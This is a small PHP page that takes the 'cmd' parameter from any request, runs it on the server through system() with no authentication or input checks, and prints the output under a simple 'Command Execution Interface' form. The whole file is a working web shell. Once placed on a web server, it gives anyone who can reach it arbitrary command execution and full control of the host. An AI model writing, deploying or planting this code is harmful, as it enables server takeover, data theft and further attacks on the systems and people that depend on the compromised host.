<?php
// PHP Logic: Executes system commands using $_REQUEST['cmd']
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- HTML Part -->
<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
</head>
<body>
    <h2>Command Execution Interface</h2>
    <form method="GET" action="">
        <input type="text" name="cmd" placeholder="Enter command" autofocus size="50">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
